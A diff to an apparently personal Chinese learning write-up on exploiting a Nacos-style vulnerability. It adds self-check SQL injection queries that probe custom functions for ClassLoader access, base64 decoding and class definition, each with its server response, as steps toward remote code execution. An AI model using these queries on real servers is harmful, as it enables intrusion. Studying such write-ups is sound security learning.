@@ -715,6 +715,25 @@ select count(*) as b, n('org.springframework.boot.loader.xxxx') as a from config
 ![](assets/011.png)
 
 
+自检的 SQL
+
+```sql
+select count(*) as b,g() as a from config_info /*limit*/
+-- {"code":200,...,"A":"jdk.internal.loader.ClassLoaders$AppClassLoader@..."}
+
+
+select count(*) as b,d('aGVsbG8=') as a from config_info /*limit*/
+-- D 能调（base64 解码通道通）
+
+
+select count(*) as b,n('java.lang.String') as a from config_info /*limit*/
+-- A 是 java.lang.String
+
+
+select count(*) as b,f('x',d('AAAA'),g(),null,n('org.springframework.boot.loader.Launcher')) as a from config_info /*limit*/
+-- 500 + ClassFormatError: Invalid ClassFile structure
+```
+
 ## 小结
 
 之前没打过这个漏洞，当做是学习一下。
